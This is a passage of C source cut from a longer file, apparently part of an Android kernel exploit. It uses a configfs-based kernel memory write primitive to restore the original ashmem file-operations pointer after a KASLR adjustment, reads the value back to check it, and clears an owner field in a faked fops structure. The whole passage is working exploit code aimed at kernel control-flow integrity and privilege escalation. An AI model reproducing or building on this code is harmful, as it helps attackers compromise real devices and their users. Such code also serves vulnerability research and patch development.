    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
